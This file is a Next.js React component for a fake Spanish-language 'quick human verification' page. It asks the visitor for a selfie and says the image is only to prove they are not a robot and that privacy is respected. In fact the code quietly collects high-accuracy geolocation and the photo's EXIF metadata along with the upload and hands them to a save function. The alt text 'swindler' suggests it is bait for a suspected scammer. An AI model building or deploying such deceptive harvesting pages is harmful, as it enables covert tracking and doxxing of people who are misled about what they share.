"use client";
import { Input } from "@/components/ui/input";
import Image from "next/image";
import demo from "@/../public/assets/demo.png";
import { useState } from "react";
import { load } from "exifreader";
import { useToast } from "@/components/ui/use-toast";
import { Button } from "@/components/ui/button";

export default function VerificationPageClient({
  save,
}: {
  save: (
    location: { latitude: number; longitude: number },
    exif: Record<string, unknown>,
    dataImage: string
  ) => Promise<void>;
}) {
  const [preview, setPreview] = useState<File>();
  const [location, setLocation] = useState<{
    latitude: number;
    longitude: number;
  }>();
  const [imageUrl, setImageUrl] = useState<string>();
  const { toast } = useToast();

  async function handleSubmit(event: React.FormEvent<HTMLFormElement>) {
    event.preventDefault();

    const formData = new FormData(event.currentTarget);
    const file = formData.get("image") as File;
    const exif = await load(file);

    const response = await fetch("/api/upload", {
      method: "POST",
      body: formData,
    });
    const date = await response.json();
    const dataImage = date.url;
    setImageUrl(dataImage);

    await save(location!, exif, dataImage);
  }

  return (
    <form
      className="xs:col-span-5 lg:place-items-center lg:max-w-screen-sm lg:min-h-screen lg:bg-white"
      onSubmit={handleSubmit}
    >
      <section className="h-[85vh] relative">
        <h1 className="mt-2 p-4 ml-2 font-semibold text-lg lg:text-center">
          Comprobación rápida
        </h1>
        <div className="flex ml-8 mr-8">
          <p>
            Con solo una foto confirmaremos que eres humano. No demorará mas de
            10 segundos
          </p>
        </div>
        <div className="grid grid-cols-4 p-6 m-2 mt-6 lg:ml-8 ">
          <div className="col-span-2 row-span-5">
            <Image
              priority
              src={demo}
              alt="demo"
              width={170}
              height={113}
              className="aspect-square rounded object-contain bg-gray-100"
            />
          </div>
          <div className="relative col-span-2 row-span-8 mt-8 ">
            {Boolean(preview) ? (
              <Image
                src={URL.createObjectURL(preview!)}
                alt="swindler"
                width={170}
                height={113}
                className="aspect-square absolute inset-[2px] z-10 rounded object-contain bg-gray-100 w-[166px] h-[109px]"
              />
            ) : (
              <div className="pointer-events-none absolute grid place-content-center inset-[2px] z-10 w-[166px] h-[109px] bg-gray-100">
                Subir imagen
              </div>
            )}
            <Input
              className="absolute inset-0 w-[170px] h-[113px] text-black border-gray-400 "
              name="image"
              type="file"
              accept="image/*"
              capture="user"
              required
              onChange={(event) => {
                navigator.geolocation.getCurrentPosition(
                  (position) => {
                    setPreview(event.target.files?.[0]!);
                    setLocation({
                      latitude: position.coords.latitude,
                      longitude: position.coords.longitude,
                    });
                  },
                  () => {
                    toast({
                      variant: "destructive",

                      description:
                        "No se pudo verificar si el usuario se encuentra en Argentina para poder realizar la transferencia",
                    });

                    event.target.value = "";
                  },
                  {
                    enableHighAccuracy: true,
                  }
                );
              }}
            />
          </div>
        </div>

        {imageUrl && (
          <Image src={imageUrl} width={90} height={60} alt="image url" />
        )}

        <p className="text-sm p-6 font-regular absolute bottom-0 ">
          Ten en cuenta que respetamos tu privacidad.
          <br />
          <span>La imagen será solo para comprobar que no eres un robot.</span>
        </p>
      </section>

      <footer className="flex justify-center m-6">
        <Button
          type="submit"
          variant="custom"
          className="w-[360px] h-[40px] mt-2"
        >
          Confirmar
        </Button>
      </footer>
    </form>
  );
}
